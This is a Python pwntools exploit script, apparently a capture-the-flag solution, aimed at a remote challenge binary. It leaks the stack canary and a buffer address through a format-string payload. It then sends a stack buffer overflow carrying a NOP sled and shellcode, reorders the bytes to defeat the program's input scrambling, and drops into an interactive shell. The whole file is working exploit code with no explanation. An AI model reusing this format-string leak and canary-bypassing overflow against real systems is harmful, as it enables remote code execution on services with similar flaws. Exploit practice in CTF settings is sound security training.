from pwn import *
import re
from time import sleep
import subprocess as sb

BINARY = "chall"
context.binary = BINARY
ELF = context.binary

# p = ELF.process()
p = remote("34.76.206.46", 10003)

def scramble(x):
    ptr = 0
    name = x[ptr:ptr+n]
    ptr += n
    admno = x[ptr:ptr+an]
    ptr += an
    branch = x[ptr:ptr+b]
    ptr += b
    university = x[ptr:ptr+u]
    ptr += u
    address = x[ptr:ptr+a]
    ptr += a
    
    new_x = name[:n//2] + branch[:b//3] + admno[:an//3] + university[:u//2] + address[:a//10] + branch[b//3:] + name[n//2:] + address[a//10:a//10 + a//10] + university[u//2:u//2+u//4] + admno[an//3:] + address[a//10+a//10:] + university[u//2+u//4:] + x[ptr:]
    return new_x

def fix_payload(n, an, b, u, a, payload):
    s = n+an+b+u+a
    x = []
    for i in range(s):
        x.append(i)
    x = scramble(x)
    new_payload = [0]*len(payload)
    for i in range(len(x)):
        new_payload[x[i]] = payload[i]
    new_payload[s:] = payload[s:]
    return new_payload

payload = b"%7$p%77$p"
p.recvuntil(b"[yes/no]?\n")
p.send(payload)

recvd = p.recvline().strip().decode()
BUFFER = int("0x" + recvd.split("0x")[1], 16)
CANARY = int("0x" + recvd.split("0x")[-1], 16)

log.info(f"canary -> {hex(CANARY)}")
log.info(f"buffer -> {hex(BUFFER)}")

p.sendlineafter(b"correct?\n", b"yes")
p.recvuntil(b"input is less\n")
n, an, b, u, a = [int(x) for x in re.findall("\d+", p.recvline().decode())]
s = n+an+b+u+a

sb.run("./shellcode_compile.sh shellcode.s", shell=True)
shellcode = open("shellcode.bin","rb").read().strip()
sb.run("rm -rf ./shellcode.bin", shell=True)
# shellcode = asm(shellcraft.execve(path="/bin/sh"))
payload = b"\x90"*50 + shellcode
payload += b"\x00"*(520-len(payload))
payload += p64(CANARY)
payload += b"a"*8
payload += p64(BUFFER)

payload = fix_payload(n, an, b, u, a, payload)
payload = bytearray(payload)
p.sendline(payload)

p.interactive()